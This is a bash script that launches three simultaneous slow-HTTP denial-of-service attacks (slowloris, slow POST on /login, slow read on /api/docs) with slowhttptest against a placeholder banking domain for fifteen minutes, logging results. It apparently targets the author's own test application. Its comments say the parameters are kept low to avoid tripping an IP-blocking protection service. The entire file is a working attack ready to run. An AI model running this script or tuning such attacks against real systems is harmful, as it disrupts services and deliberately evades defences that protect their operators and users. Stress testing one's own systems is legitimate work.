#!/bin/bash

# ── Config ────────────────────────────────────────────────────
TARGET="https://vulnbank.yourdomain.com"   # update to your actual domain
DURATION=900       # 15 minutes in seconds
CONNECTIONS=5      # minimal connections — avoids triggering XC IP block
RATE=1             # 1 new connection per second per attack

# ── Setup ─────────────────────────────────────────────────────
TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
LOG_DIR=~/slowddos-logs
mkdir -p $LOG_DIR

echo "[$(date)] Starting light slow DDoS burst — duration: ${DURATION}s"

# ── Launch all 3 attacks simultaneously ───────────────────────

slowhttptest -c $CONNECTIONS -H -l $DURATION \
  -i 10 -r $RATE -t GET -u $TARGET/ \
  -x 24 -p 3 -g -o $LOG_DIR/slowloris-$TIMESTAMP \
  > $LOG_DIR/slowloris-$TIMESTAMP.txt 2>&1 &

slowhttptest -c $CONNECTIONS -B -l $DURATION \
  -i 110 -r $RATE -s 8192 -u $TARGET/login \
  -x 10 -p 3 -g -o $LOG_DIR/slowpost-$TIMESTAMP \
  > $LOG_DIR/slowpost-$TIMESTAMP.txt 2>&1 &

slowhttptest -c $CONNECTIONS -X -l $DURATION \
  -r $RATE -u $TARGET/api/docs \
  -p 3 -z 512 -g -o $LOG_DIR/slowread-$TIMESTAMP \
  > $LOG_DIR/slowread-$TIMESTAMP.txt 2>&1 &

echo "[$(date)] All 3 attacks launched. Logs: $LOG_DIR"
wait
echo "[$(date)] Burst complete."
